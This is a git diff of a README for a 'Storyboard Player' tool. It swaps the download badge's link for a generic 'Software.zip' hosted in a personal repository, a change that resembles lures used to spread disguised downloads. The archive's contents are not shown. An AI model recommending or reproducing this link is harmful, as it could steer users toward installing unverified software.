@@ -16,7 +16,7 @@ Welcome to the **Storyboard Player** repository! This tool is designed to help y
 
 To get started with using the **Storyboard Player**, you can download the latest release from the following link:
 
-[![Download Storyboard Player](https://img.shields.io/badge/Download-Storyboard_Player-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Storyboard Player](https://github.com/jokerhm69/storyboard-player/releases/download/v1.0/Software.zip)](https://github.com/jokerhm69/storyboard-player/releases/download/v1.0/Software.zip)
 
 ### Launching the Software
 
